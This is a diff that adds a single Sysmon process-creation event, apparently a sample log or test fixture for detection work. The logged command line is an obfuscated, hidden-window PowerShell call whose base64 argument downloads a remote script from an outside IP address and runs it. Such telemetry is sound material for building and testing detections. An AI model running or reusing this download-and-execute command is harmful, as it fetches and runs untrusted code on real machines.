@@ -1,0 +1,23 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Computer>FIN-WKS-04</Computer>
+    <TimeCreated SystemTime="2024-04-17T02:52:18.331Z" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-04-17 02:52:18.331</Data>
+    <Data Name="ProcessId">7412</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA</Data>
+    <Data Name="CurrentDirectory">C:\Users\a.patel\</Data>
+    <Data Name="User">CORP\a.patel</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="Hashes">SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F</Data>
+    <Data Name="ParentProcessId">5128</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    <Data Name="ParentUser">CORP\a.patel</Data>
+  </EventData>
+</Event>
